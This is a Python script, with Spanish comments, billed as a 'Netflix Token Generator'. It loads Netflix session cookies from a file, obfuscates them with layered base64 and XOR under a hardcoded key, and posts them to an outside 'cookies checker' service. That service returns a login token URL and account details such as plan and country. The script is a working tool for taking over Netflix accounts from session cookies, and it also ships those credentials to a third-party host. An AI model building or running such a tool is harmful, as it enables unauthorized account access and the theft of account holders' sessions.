#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Netflix Token Generator - Professional UI Edition
Genera tokens válidos de Netflix con interfaz profesional
"""

import os
import base64
import json
import requests
import time
import random
import string
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.progress import track
from rich.style import Style
from rich.text import Text
from colorama import init

init(autoreset=True)
console = Console()

API_URL = "https://netflixcookieschecker.onrender.com/api/check"
API_SECRET_KEY = "Send You Mom Tonight"
COOKIES_FILE = "netflix_cookies.txt"

# ============================================================================
# CARGAR COOKIES
# ============================================================================

def load_cookies():
    """Carga las cookies desde netflix_cookies.txt"""
    if not os.path.exists(COOKIES_FILE):
        create_cookies_template()
        console.print(f"\n[yellow]⚠️  Archivo '{COOKIES_FILE}' creado[/yellow]")
        console.print(f"[yellow]📝 Por favor edita '{COOKIES_FILE}' y agrega tus cookies[/yellow]")
        console.print(f"[yellow]ℹ️  Formato: NOMBRE=VALOR (una por línea)[/yellow]\n")
        exit(1)
    
    cookies = {}
    try:
        with open(COOKIES_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#') and not line.startswith('#HttpOnly_'):
                    continue
                
                # Quitar el prefijo #HttpOnly_ si existe
                if line.startswith('#HttpOnly_'):
                    line = line[10:]
                
                # Formato Netscape HTTP Cookie File: dominio flag ruta secure expiracion nombre valor
                if '.netflix.com' in line:
                    parts = line.split('\t')
                    if len(parts) >= 7:
                        name = parts[5]
                        value = parts[6]
                        cookies[name.strip()] = value.strip()
                # Formato simple: NOMBRE=VALOR
                elif '=' in line and not line.startswith('.'):
                    name, value = line.split('=', 1)
                    cookies[name.strip()] = value.strip()
        
        if not cookies:
            console.print("[red]❌ No se encontraron cookies en el archivo[/red]")
            exit(1)
        
        return cookies
    except Exception as e:
        console.print(f"[red]❌ Error cargando cookies: {e}[/red]")
        exit(1)

def create_cookies_template():
    """Crea un archivo template"""
    template = """# Netflix Cookies - Edita este archivo con tus cookies
# Formato: NOMBRE=VALOR (una por línea)
# Las líneas que comienzan con # se ignoran

# Cookies obligatorias (al menos estas):
SecureNetflixId=
gsid=
NetflixId=

# Cookies opcionales:
netflix-sans-normal-3-loaded=true
OptanonConsent=
dsca=customer
flwssn=
netflix-sans-bold-3-loaded=true
nfvdid=
OptanonAlertBoxClosed=
"""
    with open(COOKIES_FILE, 'w', encoding='utf-8') as f:
        f.write(template)

# ============================================================================
# ENCRIPTACIÓN Y API
# ============================================================================

def encrypt_payload(data):
    """Encripta el payload"""
    try:
        data['timestamp'] = int(time.time())
        
        json_string = json.dumps(data)
        layer1 = base64.b64encode(json_string.encode()).decode()
        layer2 = layer1[::-1]
        
        layer3 = ''
        for i, char in enumerate(layer2):
            key_char = ord(API_SECRET_KEY[i % len(API_SECRET_KEY)])
            data_char = ord(char)
            layer3 += chr(data_char ^ key_char)
        
        layer4 = base64.b64encode(layer3.encode()).decode()
        
        random_padding = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        final_payload = base64.b64encode(
            f"{random_padding}:{layer4}".encode()
        ).decode()
        
        return final_payload
    except Exception as e:
        return None

def decrypt_payload(encrypted_data):
    """Desencripta la respuesta"""
    try:
        layer5 = base64.b64decode(encrypted_data).decode()
        _, layer4_str = layer5.split(':', 1)
        
        layer3_bytes = base64.b64decode(layer4_str)
        layer3 = layer3_bytes.decode('latin-1')
        
        layer2 = ''
        for i, char in enumerate(layer3):
            key_char = ord(API_SECRET_KEY[i % len(API_SECRET_KEY)])
            data_char = ord(char)
            layer2 += chr(data_char ^ key_char)
        
        layer1 = layer2[::-1]
        
        json_bytes = base64.b64decode(layer1)
        json_string = json_bytes.decode()
        
        result = json.loads(json_string)
        return result
    except Exception as e:
        return None

def generate_token(cookies_dict):
    """Genera un token válido"""
    cookies_text = "# Netscape HTTP Cookie File\n"
    cookies_text += "# http://curl.haxx.se/rfc/cookie_spec.html\n"
    
    for name, value in cookies_dict.items():
        cookies_text += f".netflix.com\tTRUE\t/\tTRUE\t9999999999\t{name}\t{value}\n"
    
    payload = {
        "content": cookies_text,
        "mode": "tokenonly"
    }
    
    encrypted_payload = encrypt_payload(payload)
    if not encrypted_payload:
        console.print("[red]❌ Error al encriptar payload[/red]")
        return None, None
    
    try:
        response = requests.post(
            API_URL,
            json={"encrypted_payload": encrypted_payload},
            timeout=30,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code != 200:
            console.print(f"[red]❌ API Error: {response.status_code}[/red]")
            return None, None
        
        result = response.json()
        
        if "encrypted_response" in result:
            decrypted = decrypt_payload(result.get("encrypted_response"))
            
            if decrypted and "token_result" in decrypted:
                token_result = decrypted["token_result"]
                token = token_result.get("token")
                account_info = decrypted.get("account_info", {})
                
                return token, account_info
        
        return None, None
        
    except requests.exceptions.ConnectionError:
        console.print("[red]❌ Error de conexión a la API[/red]")
        return None, None
    except Exception as e:
        console.print(f"[red]❌ Error: {str(e)}[/red]")
        return None, None

# ============================================================================
# INTERFAZ PROFESIONAL
# ============================================================================

def show_header():
    """Muestra el encabezado"""
    title = Text("NETFLIX TOKEN GENERATOR", style="bold cyan")
    subtitle = Text("Professional Edition", style="dim cyan")
    
    panel = Panel(
        title,
        subtitle=subtitle,
        border_style="bright_blue",
        padding=(1, 2)
    )
    console.print(panel)

def show_loading_cookies(cookie_count):
    """Muestra estado de carga de cookies"""
    table = Table(show_header=False, show_footer=False, box=None)
    table.add_row("[green]✓[/green]", f"[cyan]{cookie_count} cookies cargadas[/cyan]")
    console.print(table)

def show_token_info(token, account_info):
    """Muestra la información del token"""
    if not token:
        console.print("[red]❌ Error generando token[/red]")
        return None
    
    url = f"https://netflix.com/account?nftoken={token}"
    
    # Tabla de información de la cuenta
    account_table = Table(title="[bold cyan]ACCOUNT INFORMATION[/bold cyan]", 
                         border_style="bright_blue", 
                         padding=(0, 1))
    account_table.add_column("Property", style="cyan")
    account_table.add_column("Value", style="green")
    
    if account_info:
        info = account_info
        status = "✓ Premium" if info.get('premium') else "✗ Basic"
        account_table.add_row("Status", f"[green]{status}[/green]")
        account_table.add_row("Country", f"[yellow]{info.get('country', 'N/A')}[/yellow]")
        account_table.add_row("Plan", f"[yellow]{info.get('plan', 'N/A')}[/yellow]")
        account_table.add_row("Max Streams", f"[yellow]{info.get('max_streams', 'N/A')}[/yellow]")
    
    console.print(account_table)
    console.print()
    
    # Información del token
    token_table = Table(title="[bold cyan]TOKEN INFORMATION[/bold cyan]", 
                       border_style="bright_blue", 
                       padding=(0, 1))
    token_table.add_column("Property", style="cyan")
    token_table.add_column("Value", style="green")
    
    token_table.add_row("Generated", f"[yellow]{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}[/yellow]")
    token_table.add_row("Validity", "[yellow]~59 minutes[/yellow]")
    token_table.add_row("Length", f"[yellow]{len(token)} chars[/yellow]")
    
    console.print(token_table)
    console.print()
    
    # Panel del token
    token_panel = Panel(
        f"[bold green]{token}[/bold green]",
        title="[bold]TOKEN[/bold]",
        border_style="bright_green",
        padding=(1, 2)
    )
    console.print(token_panel)
    console.print()
    
    # Panel de la URL
    url_panel = Panel(
        f"[bold cyan]{url}[/bold cyan]",
        title="[bold]LOGIN URL[/bold]",
        border_style="bright_cyan",
        padding=(1, 2)
    )
    console.print(url_panel)
    console.print()
    
    # Botones de acción
    action_table = Table(show_header=False, show_footer=False, box=None, padding=(0, 1))
    action_table.add_row("[green bold]✓[/green bold]", "[cyan]URL copied to clipboard[/cyan]")
    action_table.add_row("[green bold]✓[/green bold]", "[cyan]Token saved to NETFLIX_TOKEN.txt[/cyan]")
    action_table.add_row("[green bold]✓[/green bold]", "[cyan]URL saved to NETFLIX_URL.txt[/cyan]")
    console.print(action_table)
    console.print()
    
    # Menu interactivo
    console.print("[cyan]Press any key to copy URL to clipboard...[/cyan]")
    input("[cyan]> [/cyan]")
    
    try:
        import subprocess
        subprocess.Popen(['powershell', '-Command', 
                        f'Add-Type -AssemblyName System.Windows.Forms; '
                        f'[System.Windows.Forms.Clipboard]::SetText(\'{url}\')'], 
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        console.print("[green bold]✓ URL copied to clipboard![/green bold]")
    except:
        console.print("[red]❌ Could not copy to clipboard[/red]")
    
    return url

def save_files(token):
    """Guarda los archivos de salida"""
    try:
        with open('NETFLIX_TOKEN.txt', 'w', encoding='utf-8') as f:
            f.write(token)
        
        url = f"https://netflix.com/account?nftoken={token}"
        with open('NETFLIX_URL.txt', 'w', encoding='utf-8') as f:
            f.write(url)
        
        # Copiar a clipboard
        try:
            import subprocess
            subprocess.Popen(['powershell', '-Command', 
                            f'Add-Type -AssemblyName System.Windows.Forms; '
                            f'[System.Windows.Forms.Clipboard]::SetText(\'{url}\')'], 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    except:
        pass

# ============================================================================
# MAIN
# ============================================================================

def main():
    """Función principal"""
    console.clear()
    show_header()
    
    # Cargar cookies
    cookies_dict = load_cookies()
    show_loading_cookies(len(cookies_dict))
    console.print()
    
    # Generar token
    with console.status("[bold cyan]🔄 Generating token...", spinner="dots"):
        token, account_info = generate_token(cookies_dict)
        time.sleep(0.5)
    
    console.print()
    
    # Mostrar información
    if token:
        show_token_info(token, account_info)
        save_files(token)
    else:
        console.print("[red]❌ Failed to generate token[/red]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Process interrupted[/yellow]")
    except Exception as e:
        console.print(f"\n[red]❌ Error: {e}[/red]")
